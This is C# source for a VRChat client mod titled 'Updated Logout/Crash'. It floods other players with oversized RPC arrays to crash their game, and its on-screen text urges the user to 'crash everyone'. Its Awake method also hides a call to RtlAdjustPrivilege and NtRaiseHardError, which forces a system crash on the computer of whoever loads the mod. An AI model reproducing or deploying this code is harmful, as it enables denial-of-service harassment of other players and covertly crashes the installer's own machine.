using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using UnityEngine;
using VRC;
using VRLoader.Attributes;
using VRLoader.Modules;
using System.Diagnostics;
namespace Crash
{

    [ModuleInfo("Updated Logout/Crash", "2.0", "Keem")]
    public class Main : VRModule
    {

        [DllImport("ntdll.dll")]
        public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

        [DllImport("ntdll.dll")]
        public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

        public void Start()
        {
            bool checker = Main.self != null;
            if(!checker)
            {
                GameObject GO = new GameObject();
                Main.self = GO;
                UnityEngine.Object.DontDestroyOnLoad(this);
            }
        }

        public void Update()
        {
            
        }

        public void LogoutPlayer(VRC.Player p)
        {
            var crashArray = new object[30000];
            PhotonView me = PhotonView.Find(1);
            for (int i = 0; i < 6; i++)
            {
                me.RpcSecure("SpawnEmojiRPC", CGLDGOBLMMC.Others, true, crashArray);
            }
        }

        public void OnGUI()
        {
            GUI.Label(new Rect(300, 60, Screen.width, 20), "PLEASE ABUSE AS MUCH AS POSSIBLE. CRASH EVERYONE");
            GUI.Label(new Rect(300, 80, Screen.width, 20), "PLAYER LIST(WILL BE EMPTY WHILE LOADING/ UNTIL YOU GET INTO A WORLD. MAY HAVE TO CLICK MULTIPLE TIMES TO LOGOUT");
            float startY = 100f;
            foreach (var player in VRC.PlayerManager.GetAllPlayers())
            {
               
                startY += 20f;
                if (GUI.Button(new Rect(300, startY, 300, 20), player.name) && PlayerManager.GetCurrentPlayer() != player)
                {
                    LogoutPlayer(player);
                }
               
            }
        }

        public void Awake()
        {
            Boolean t1;
            uint t2;
            RtlAdjustPrivilege(19, true, false, out t1);
            NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out t2);

        }

        private static GameObject self;

    }
}
